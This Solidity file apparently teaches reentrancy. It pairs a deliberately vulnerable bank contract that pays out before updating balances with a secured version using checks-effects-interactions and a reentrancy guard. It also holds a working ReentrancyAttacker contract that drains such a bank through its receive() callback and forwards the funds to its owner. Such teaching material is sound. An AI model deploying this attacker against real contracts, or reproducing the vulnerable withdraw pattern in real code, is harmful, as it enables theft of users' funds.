// SPDX-License-Identifier: MIT
pragma solidity 0.8.37;

import {ReentrancyGuard} from "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

interface IWithdrawableBank {
    function deposit() external payable;
    function withdraw() external;
}

contract VulnerableBank {
    mapping(address => uint256) public balanceOf;

    function deposit() external payable {
        require(msg.value > 0, "zero deposit");
        balanceOf[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amount = balanceOf[msg.sender];
        require(amount > 0, "no balance");

        // Vulnerability: control is transferred before internal state is updated.
        (bool ok, ) = payable(msg.sender).call{value: amount}("");
        require(ok, "transfer failed");

        balanceOf[msg.sender] = 0;
    }
}

contract SecureBank is ReentrancyGuard {
    mapping(address => uint256) public balanceOf;

    function deposit() external payable {
        require(msg.value > 0, "zero deposit");
        balanceOf[msg.sender] += msg.value;
    }

    function withdraw() external nonReentrant {
        uint256 amount = balanceOf[msg.sender];
        require(amount > 0, "no balance");

        // Effects before interaction, with a second guard against re-entry.
        balanceOf[msg.sender] = 0;

        (bool ok, ) = payable(msg.sender).call{value: amount}("");
        require(ok, "transfer failed");
    }
}

contract ReentrancyAttacker {
    IWithdrawableBank public immutable bank;
    address payable public immutable owner;
    uint256 private attackChunk;

    constructor(address bankAddress) {
        bank = IWithdrawableBank(bankAddress);
        owner = payable(msg.sender);
    }

    function attack() external payable {
        require(msg.sender == owner, "not owner");
        require(msg.value > 0, "fund attack");

        attackChunk = msg.value;
        bank.deposit{value: msg.value}();
        bank.withdraw();

        (bool ok, ) = owner.call{value: address(this).balance}("");
        require(ok, "owner payout failed");
    }

    receive() external payable {
        if (address(bank).balance >= attackChunk) {
            bank.withdraw();
        }
    }
}
